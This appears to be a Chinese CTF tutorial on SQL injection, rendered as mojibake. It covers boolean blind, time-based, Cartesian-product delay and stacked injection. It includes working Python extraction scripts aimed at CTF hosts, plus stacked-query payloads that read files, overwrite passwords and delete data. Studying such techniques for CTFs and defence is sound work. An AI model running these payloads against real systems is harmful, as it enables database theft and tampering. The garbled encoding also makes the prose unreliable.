æ³¨å…¥æµç¨‹\né¦–å…ˆé€šè¿‡é¡µé¢å¯¹äºæ°¸çœŸæ¡ä»¶or 1=1 ä¸æ°¸å‡æ¡ä»¶ and 1=2 çš„è¿”å›å†…å®¹æ˜¯å¦å­˜åœ¨å·®å¼‚è¿›è¡Œåˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚\n\nä¸‹é¢ç»™å‡ºå¸¸ç”¨çš„å¸ƒå°”ç›²æ³¨è„šæœ¬ã€‚\n\n- GETå‹æ³¨å…¥\n```python\nimport requests\nimport time\nurl = 'http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/'\n\ncookies = {       # å¦‚æœç›®æ ‡ç½‘ç«™è¦äº‹å…ˆç™»å½•ï¼Œå°±åŠ ä¸Šcookieså§\n    \"PHPSESSID\":\"c8ab8r49nd2kk0qfhs0dcaktl3\"\n}\n\nflag = ''\nfor i in range(1,90000):\n   low = 32\n   high = 128\n   mid = (low+high)//2\n   while(low<high):\n       payload = \"http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0' or ascii(substr(database(),%d,1))>%d-- \" %(i,mid)    # æ³¨æ„getå‹çš„æ³¨å…¥æ³¨é‡Šç¬¦è¦ç”¨--ç©ºæ ¼\n       res = requests.get(url=payload)\n\n       if 'You are in' in res.text:      # ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶\n           low = mid+1\n       else:\n           high = mid\n       mid = (low+high)//2\n   if(mid ==32 or mid ==127):\n       break\n   flag = flag+chr(mid)\n   print(flag)\n```\n\n- POSTå‹æ³¨å…¥\n```python\nimport requests\nurl = 'http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php'\nflag = ''\nfor i in range(1,250):\n   low = 32\n   high = 128\n   mid = (low+high)//2\n   while(low<high):\n       #payload = 'http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#' %(i,mid)\n       payload = \"0^(ascii(substr((select(flag)from(flag)),%d,1))>%d)#\" %(i,mid)\n       datas = {\n                     \"id\":payload\n                }\n       res = requests.post(url=url,data=datas)\n\n       if 'girlfriend' in res.text:      # ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶\n           low = mid+1\n       else:\n           high = mid\n       mid = (low+high)//2\n   if(mid ==32 or mid ==127):\n       break\n   flag = flag+chr(mid)\n   print(flag)\n```\n\né¦–å…ˆï¼Œæˆ‘ä»¬å…ˆåˆ†æè„šæœ¬çš„æ€è·¯ï¼Œè„šæœ¬åˆ©ç”¨äº†requeståº“æ¥å‘é€è¯·æ±‚ï¼ŒåŒæ—¶å®šä¹‰äº†ä¸€ä¸ªflagå­—ç¬¦ä¸²ç”¨æ¥å‚¨å­˜flagã€‚ç„¶åå†™äº†ä¸€ä¸ªforå¾ªç¯ï¼Œå°é¡¶è·‘250éï¼Œç„¶åå®šä¹‰äº†lowå’Œhighï¼Œè¿™é‡Œæ ¹æ®çš„æ˜¯ASCIIç ä¸­çš„æ‰“å°å­—ç¬¦ï¼Œå®šä¹‰äº†ä¸­é—´å€¼ï¼Œå› ä¸ºä¸€ä¼šå„¿è¦ä½¿ç”¨çš„æ˜¯äºŒåˆ†æ³•ï¼Œå½“low<highæ—¶è¿›å…¥whileå¾ªç¯ï¼Œæ‰§è¡Œpayloadæ˜¯å¦å¤§äºmidçš„åˆ¤æ–­ï¼Œè¿™é‡ŒGETå’ŒPOSTç•¥æœ‰åŒºåˆ«ï¼ŒGETä¼ å…¥çš„é”®å€¼å¯¹ï¼Œåˆ©ç”¨requests.postæ–¹æ³•è¿›è¡Œè¯·æ±‚ï¼ŒGETç›´æ¥æŠŠPayloadæ‹¼æ¥åœ¨urlåé¢è¿›è¡Œrequests.getæ–¹æ³•å³å¯ï¼Œç„¶åæ ¹æ®æˆ‘ä»¬åˆ¤æ–­çœŸå‡çš„æ–¹å¼å†™ä¸€ä¸ªifå¾ªç¯ï¼Œè¿™é‡Œçš„res.textæ˜¯è¿”å›æ•°æ®ï¼Œå¯ä»¥å…ˆå†™ä¸ªç®€å•è„šæœ¬çœ‹ä¸€ä¸‹è¯¥æ€ä¹ˆä»å…¶ä¸­åˆ¤æ–­çœŸå‡ï¼Œå¦‚æœä¸ºçœŸlow=mid+1ï¼Œç„¶åå†å–ä¸­é—´å€¼ï¼Œå¦‚æœä¸ºå‡åˆ™high=midç„¶åå–ä¸­é—´å€¼ï¼Œç›´åˆ°lowå¤§äºhighå°±èƒ½ç¡®å®šå‡ºè¯¥ä½ç½®çš„ASCIIç äº†ï¼Œç„¶åæœ€ä¸‹é¢çš„ifå¾ªç¯æ˜¯æ’é™¤æ‰åœ¨ä¸¤ç«¯çš„ç‰¹æ®Šæƒ…å†µï¼Œç„¶åæ¯æ¬¡å¾ªç¯æ‰“å°ä¸€æ¬¡flagï¼Œæœ‰æ—¶å€™å¯èƒ½è¿˜è¦è®¾ç½®å»¶æ—¶ï¼Œè¿™é‡Œæ²¡æœ‰ç®¡ã€‚\n\nåˆ©ç”¨å¼‚æˆ–çš„ï¼š\n```bash\n?id=0'^1--+\n?id=0'^0--+\n?id=0'^(ascii(substr(database(),1,1))>1)--+\n?id=0'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),{0},1))={1})--+\n```\nåˆ©ç”¨order byçš„\n\n    è¯¥æ–¹æ³•åªé€‚ç”¨äºè¡¨é‡Œå°±ä¸€è¡Œæ•°æ®çš„æ—¶å€™ã€‚\n\nå¦‚æœæ³¨å…¥çš„æ—¶å€™æ²¡æœ‰æŠ¥é”™ï¼Œæˆ‘ä»¬åˆä¸çŸ¥é“åˆ—åï¼Œå°±åªèƒ½ç”¨ order by ç›²æ³¨äº†ã€‚å½“ç„¶ï¼Œåœ¨ è¿‡æ»¤äº†æ‹¬å· çš„æ—¶å€™ï¼Œorder by ç›²æ³¨ä¹Ÿæ˜¯ä¸ªå¾ˆå¥½çš„åŠæ³•ã€‚\norder by çš„ä¸»è¦ä½œç”¨å°±æ˜¯è®©æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®æ ¹æ®ç¬¬nåˆ—è¿›è¡Œæ’åºï¼ˆé»˜è®¤å‡åºï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨order byæ’åºæ¯”è¾ƒå­—ç¬¦çš„ ascii ç å¤§å°ï¼Œä»ç¬¬â¼€ä½å¼€å§‹æ¯”è¾ƒï¼Œç¬¬â¼€ä½ç›¸åŒæ—¶æ¯”è¾ƒä¸‹â¼€ä½ã€‚\nåˆ©ç”¨æ–¹å¼å‚è§å¦‚ä¸‹æµ‹è¯•ï¼š\n```bash\nmysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | 2        | 5                                |\n|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |\n+----+----------+----------------------------------+\n2 rows in set (0.00 sec)\n\nmysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |\n|  1 | 2        | 6                                |\n+----+----------+----------------------------------+\n2 rows in set (0.01 sec)\n\nmysql> select * from admin where username='' or 1 union select 1,2,'51' order by 3;\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | 2        | 51                               |\n|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |\n+----+----------+----------------------------------+\n2 rows in set (0.00 sec)\n\nmysql> select * from admin where username='' or 1 union select 1,2,'52' order by 3;\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |\n|  1 | 2        | 52                               |\n+----+----------+----------------------------------+\n2 rows in set (0.00 sec)\n```\né€šè¿‡é€ä½åˆ¤æ–­ä¾¿å¯å¾—åˆ°password\n\nå‚è€ƒè„šæœ¬ï¼š\n```python\nimport requests\n# å®šä¹‰ä¸€ä¸ªflagå–å€¼çš„ä¸€ä¸ªâ€œèŒƒå›´â€\ndic = \"1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&*\"\n# ä¹‹æ‰€ä»¥ä¸å®šä¹‰ä¸ºç©ºï¼Œè€Œæ˜¯â€œ^â€ï¼Œæ˜¯ä¸ºäº†ä»å¤´å¼€å§‹åŒ¹é…\nflag = \"^\"\n# ç›®æ ‡urlï¼Œå…ˆä¼ â€œ|1â€ï¼Œè·å–å…¶æ•°æ®çš„æ’åˆ—å†…å®¹ï¼Œä½œä¸ºä¸€ä¸ªå¯¹æ¯”çš„åŸºå‡†\nurl1 = \"https://chall.tasteless.eu/level1/index.php?dir=|1\"\ncontent1 = requests.get(url1).content\n# è¿™ä¸ªflagçš„é•¿åº¦è¢«å®šä¹‰ä¸ºäº†50ä¸ªå­—ç¬¦é•¿åº¦\nfor i in range(50):\n    # ä»å®šä¹‰çš„dicä¸­æŒ¨ä¸ªå–1å­—ç¬¦ï¼Œæ‹¼å‡‘payload\n    for letter in dic:\n        payload = flag + letter\n        #è¯¥urlæœ€åçš„â€œ}2b1â€-->\"}+1\"\n        url2 = \"https://chall.tasteless.eu/level1/index.php?dir=|{select (select flag from level1_flag) regexp \"+\"'\"+ payload +\"'\"+\"}%2b1\"\n        print(url2)\n        # è·å–å®é™…æ³¨å…¥åçš„æ’åˆ—å†…å®¹\n        content2 = requests.get(url2).content\n        # å¦‚æœä¸ç›¸ç­‰ï¼Œå³ä¸ºflagå†…å®¹ï¼ˆä¸ºä»€ä¹ˆæ˜¯ä¸ç›¸ç­‰ï¼Œè€Œä¸æ˜¯ç›¸ç­‰ï¼Œå› ä¸ºåœ¨url2çš„æœ€ååˆâ€œ+1â€ï¼Œå³åŒ¹é…æˆåŠŸåˆ™æ˜¯â€œ?dir=|2â€ï¼ŒåŒ¹é…ä¸æˆåŠŸåˆ™æ˜¯â€œ?dir=|1â€ï¼‰\n        if(content1 != content2):\n            flag = payload\n            print(flag)\n            break\n```\n\n## æ—¶é—´ç›²æ³¨\næœ‰çš„ç›²æ³¨æ—¢ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ï¼Œå…¶å®ä¹Ÿæ˜¯ä»å¦ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„è§’åº¦æ¥åˆ¤æ–­äº†å¸ƒå°”å€¼ã€‚\n\nå¯¹äºåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œé€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶çš„sqlè¯­å¥ï¼Œ ä¸”sqlè¯­å¥ä¸­æ ¹æ®éœ€è¦è”åˆä½¿ç”¨sleep()å‡½æ•°ä¸€åŒå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œ è§‚å¯ŸæœåŠ¡å™¨å“åº”ç»“æœæ˜¯å¦ä¼šæ‰§è¡Œæ‰€è®¾ç½®æ—¶é—´çš„å»¶è¿Ÿå“åº”ï¼Œä»¥æ­¤æ¥åˆ¤æ–­æ‰€æ„é€ æ¡ä»¶çš„çœŸorå‡ï¼ˆè‹¥æ‰§è¡Œsleepå»¶è¿Ÿï¼Œåˆ™è¡¨ç¤ºå½“å‰è®¾ç½®çš„åˆ¤æ–­æ¡ä»¶ä¸ºçœŸï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œæœ€ç»ˆç¡®å®šå…·ä½“çš„æ•°å€¼å¤§å°oråç§°æ‹¼å†™ã€‚\n\né¦–å…ˆä½¿ç”¨ä»¥ä¸‹payloadï¼Œæ ¹æ®é¡µé¢çš„å“åº”æ˜¯å¦æœ‰å»¶è¿Ÿæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼š\n\n```bash\n1' and sleep(5)#\n1 and sleep(5)\n```\næ—¶é—´ç›²æ³¨ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†\nä¸€èˆ¬çš„æ—¶é—´ç›²æ³¨ä¸»è¦å°±æ˜¯ä½¿ç”¨sleep()å‡½æ•°è¿›è¡Œæ—¶é—´çš„å»¶è¿Ÿï¼Œç„¶åé€šè¿‡ifåˆ¤æ–­æ˜¯å¦æ‰§è¡Œsleep()ï¼š\n```bash\nadmin' and if(ascii(substr((select database()),1,1))>1,sleep(3),0)#\n```\ntrimé…åˆæ¯”è¾ƒã€‚\n\ntrim([both/leading/trailing] ç›®æ ‡å­—ç¬¦ä¸² FROM æºå­—ç¬¦ä¸²)\n\nä»æºå­—ç¬¦ä¸²ä¸­å»é™¤é¦–å°¾/é¦–/å°¾çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œå¦‚å¯»æ‰¾å­—ç¬¦ä¸²ç¬¬ä¸€ä½ï¼Œå‡å®šXä»£è¡¨æŸå­—ç¬¦ï¼Œtrim(leading X from 'abcd') = trim(leading X+1 from 'abcd')ä¸ç›¸ç­‰ï¼Œè¯´æ˜æ­£ç¡®ç»“æœæ˜¯Xæˆ–X+1å†è¿›è¡Œtrim(leading X+1 from 'abcd') = trim(leading X+2 from 'abcd') ç›¸ç­‰åˆ™æ­£ç¡®ä¸ºXï¼Œä¸ç›¸ç­‰åˆ™X+1æ­£ç¡®\n\nè‹¥trim(leading X from 'abcd') = trim(leading X+1 from 'abcd')ç›¸ç­‰è¯´æ˜Xä¸X+1éƒ½ä¸ºå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ï¼Œä¸å­˜åœ¨è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥éœ€è¦ç»§ç»­æ¯”è¾ƒX+1ä¸X+2ç›´è‡³ç›¸ç­‰\n\n### æ³¨å…¥æµç¨‹\næ—¶é—´ç›²æ³¨æˆ‘ä»¬ä¹Ÿæ˜¯åˆ©ç”¨è„šæœ¬å®Œæˆï¼š\n```python\n\n\nimport requests\nimport json\nimport time\n\nurl = 'http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id='\nflag = ''\nfor i in range(1,250):\n   low = 32\n   high = 128\n   mid = (low+high)//2\n   while(low<high):\n\n       payload = \"http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=1' and if((ascii(substr(database(),%d,1))>%d),sleep(2),1)-- \" %(i,mid)\n\n       times = time.time()\n       res = requests.get(url=payload)\n\n       if time.time() - times >= 2:      # ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶\n           low = mid+1\n       else:\n           high = mid\n       mid = (low+high)//2\n   if(mid ==32 or mid ==127):\n       break\n   flag = flag+chr(mid)\n   print(flag)\n```\nè¿™æ˜¯ä¸€ä¸ªGETæ–¹å¼çš„æ—¶é—´ç›²æ³¨ï¼Œæ›´æ”¹è„šæœ¬è¯·æ±‚æ–¹å¼çš„æ–¹æ³•å¯ä»¥å‚ç…§ä¸Šé¢çš„å¸ƒå°”ç›²æ³¨ï¼Œè¿™ä¸¤ä¸ªè„šæœ¬çš„ç¼–å†™æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åœ¨åˆ¤æ–­æ–¹å¼ä¸Šæœ‰æ‰€åŒºåˆ«ã€‚\n\næ—¶é—´ç›²æ³¨åœ¨CTFæ¯”èµ›å’Œå¹³æ—¶ç”Ÿäº§ç¯å¢ƒä¸­éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œä½†æ˜¯å½“æˆ‘ä»¬å¸¸â½¤çš„å‡½æ•°è¢«è¿‡æ»¤çš„è¯ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿè¿˜æœ‰ä»¥ä¸‹å‡ ç§æ—¶é—´ç›²æ³¨æ–¹å¼ã€‚\n\nç¬›å¡å°”ç§¯å»¶æ—¶ç›²æ³¨\ncount(*) åé¢æ‰€æœ‰è¡¨ä¸­çš„åˆ—ç¬›å¡å°”ç§¯æ•°ï¼Œæ•°é‡è¶Šå¤šè¶Šå¡ï¼Œå°±ä¼šæœ‰å»¶è¿Ÿï¼Œç±»ä¼¼ä¹‹å‰æŸæ¯”èµ›pgsqlçš„å»¶æ—¶æ³¨å…¥ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ¥ æ‰“æ—¶é—´å·®ï¼Œä»è€Œè¾¾åˆ°å»¶æ—¶æ³¨å…¥çš„æ•ˆæœï¼š\n```bash\nmysql> SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;\n+-----------+\n| count(*)  |\n+-----------+\n| 113101560 |\n+-----------+\n1 row in set (2.07 sec)\n\nmysql> select * from ctf_test where user='1' and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);\n+------+-----+\n| user | pwd |\n+------+-----+\n| 1    | 0   |\n+------+-----+\n1 row in set (2.08 sec)\n```\n\nå¾—åˆ°çš„ç»“æœéƒ½ä¼šæœ‰å»¶è¿Ÿã€‚è¿™é‡Œé€‰ç”¨information_schema.columnsè¡¨çš„åŸå› æ˜¯å…¶å†…éƒ¨æ•°æ®è¾ƒå¤šï¼Œåˆ°æ—¶å€™å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè°ƒæ¢ã€‚\n\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŸç†ï¼Œå¹¶é…åˆif()è¯­å¥è¿›è¡Œå»¶æ—¶æ³¨å…¥äº†ï¼Œpayload ä¸ä¹‹å‰ç›¸ä¼¼ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š\n```bash\nadmin' and if(ascii(substr((select database()),1,1))>1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#\n\n[OUTPUT:]\nHTTP/1.1 504 Gateway Time-out    # æœ‰å¾ˆé•¿çš„å»¶æ—¶, ä»¥è‡³äºTime-outäº†\n```\n\nç»™å‡ºä¸€ä¸ªç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥è„šæœ¬ï¼š\n\n```python\nimport requests\nurl = 'http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login'\nflag = ''\nfor i in range(1,250):\n   low = 32\n   high = 128\n   mid = (low+high)//2\n   while(low<high):\n       payload = \"' or if((select ascii(substr((select password from user where username='admin'),%d,1)))>%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#\" % (i, mid)\n       datas = {\n                \"username\":\"admin\",\n                \"password\": payload\n        }\n       res = requests.post(url=url,data=datas,timeout=None)    # ä¸é™åˆ¶è¶…æ—¶\n\n       if '504 Gateway Time-out' in res.text:      # ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶\n           low = mid+1\n       else:\n           high = mid\n       mid = (low+high)//2\n   if(mid ==32 or mid ==127):\n       break\n   flag = flag+chr(mid)\n   print(flag)\n```\n\n## å †å æ³¨å…¥\nåœ¨SQLä¸­ï¼Œåˆ†å·; æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿ å› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚\n\nè€Œè”åˆæ³¨å…¥ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼Ÿ\n\nåŒºåˆ«å°±åœ¨äº union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™åˆ¶çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œçš„æ˜¯æŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM products; æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šselect * from products where id=1;DELETE FROM products; å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚\n\nä½†æ˜¯ï¼Œè¿™ç§å †å æ³¨å…¥ä¹Ÿæ˜¯æœ‰å±€é™æ€§çš„ã€‚å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚\n\nè™½ç„¶æˆ‘ä»¬å‰é¢æåˆ°äº†å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»æ„çš„sqlè¯­å¥ï¼Œä½†æ˜¯è¿™ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ååˆ†çš„å®Œç¾çš„ã€‚åœ¨æœ‰çš„Webç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿçš„é”™è¯¯æˆ–è€…æ‰§è¡Œç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œå»ºè®®é…åˆä½¿ç”¨ union è”åˆæ³¨å…¥ã€‚\n\nä¸€èˆ¬å­˜åœ¨å †å æ³¨å…¥çš„éƒ½æ˜¯ç”±äºä½¿ç”¨ mysqli_multi_query() å‡½æ•°æ‰§è¡Œçš„sqlè¯­å¥ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œå¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚\n\n### æ³¨å…¥æµç¨‹\n```bash\n# è¯»å–æ•°æ®\n/?id=1';show databases;--+\n/?id=1';show tables;--+\n/?id=1';show tables from database_name;--+\n/?id=1';show columns from table_name;--+\n\n# è¯»å–æ–‡ä»¶\n/?id=1';select load_file('/flag');--+\n\n# ä¿®æ”¹æ•°æ®è¡¨çš„ç»“æ„\n/?id=1';insert into users(id,username,password)values(20,'whoami','657260');--+    # æ’å…¥æ•°æ®\n/?id=1';update users set password='657260' where id>0;--+    # æ›´æ”¹æ•°æ®\n/?id=1';delete from users where id=20;--+    # åˆ é™¤æ•°æ®\n/?id=1';create table fake_users like users;--+    # åˆ›å»ºä¸€ä¸ªæ–°è¡¨\n?id=1';rename table old_table to new_table;--+    # æ›´æ”¹è¡¨å\n?id=1';alter table users change old_column new_column varchar(100);--+    # æ›´æ”¹å­—æ®µå\n```\n\nä¸‹é¢æ˜¯MySQLå †å æ³¨å…¥çš„å‡ ç§å¸¸è§å§¿åŠ¿ã€‚\n\nrename ä¿®æ”¹è¡¨å\n```bash\n1';rename table words to words1;rename table flag_here to words;#\n# renameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚\n# renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;\n```\n\nrename/alter ä¿®æ”¹è¡¨åä¸å­—æ®µå\n```bash\n1';rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#\n\nrenameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚\nrenameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;\n```\n\nåˆ©ç”¨ HANDLER è¯­å¥\nå¦‚æœrenameã€alterè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©HANDLERè¯­å¥æ¥bypassã€‚åœ¨ä¸æ›´æ”¹è¡¨åçš„æƒ…å†µä¸‹è¯»å–å¦ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚\n\nHANDLER ... OPEN è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­ HANDLER ... READ è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨ HANDLER ... CLOSE æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­ï¼Œè¯¦æƒ…è¯·è§ï¼šhttps://www.cnblogs.com/taoyaostudy/p/13479367.html\n\n```bash\n1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#\næˆ–\n1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#\n```\n\nå †å æ³¨å…¥ä¸­çš„ç›²æ³¨\nå †å æ³¨å…¥ä¸­çš„ç›²æ³¨å¾€å¾€æ˜¯æ’å…¥sqlè¯­å¥è¿›è¡Œå®è·µç›²æ³¨ï¼Œå°±æ¯”å¦‚ [SWPU2019]Web4 è¿™é“é¢˜ã€‚ç¼–å†™æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š\n```python\n#author: c1e4r\nimport requests\nimport json\nimport time\n\ndef main():\n    #é¢˜ç›®åœ°å€\n    url = '''http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login'''\n    #æ³¨å…¥payload\n    payloads = \"asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -\"\n    flag = ''\n    for i in range(1,30):\n        #æŸ¥è¯¢payload\n        payload = \"select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)\"\n        for j in range(0,128):\n            #å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç \n            datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'}\n            data = json.dumps(datas)\n            times = time.time()\n            res = requests.post(url = url, data = data)\n            if time.time() - times >= 3:\n                flag = flag + chr(j)\n                print(flag)\n                break\n\ndef str_to_hex(s):\n    return ''.join([hex(ord(c)).replace('0x', '') for c in s])\n\nif __name__ == '__main__':\n    main()\n\n```\nè¿™é‡Œè¿˜æ¶‰åŠåˆ°äº†ä¸€äº›jsonçš„å†…å®¹ï¼Œjson.dumps() æ˜¯æŠŠpythonå¯¹è±¡è½¬æ¢æˆjsonå¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œç”Ÿæˆçš„æ˜¯å­—ç¬¦ä¸²ã€‚webæœåŠ¡ä¸­ä¼ è¾“ä¿¡æ¯çš„ä¸€ç§æ–¹å¼ã€‚\n\n## äºŒæ¬¡æ³¨å…¥\näºŒæ¬¡æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†\né€šå¸¸äºŒæ¬¡æ³¨å…¥çš„æˆå› 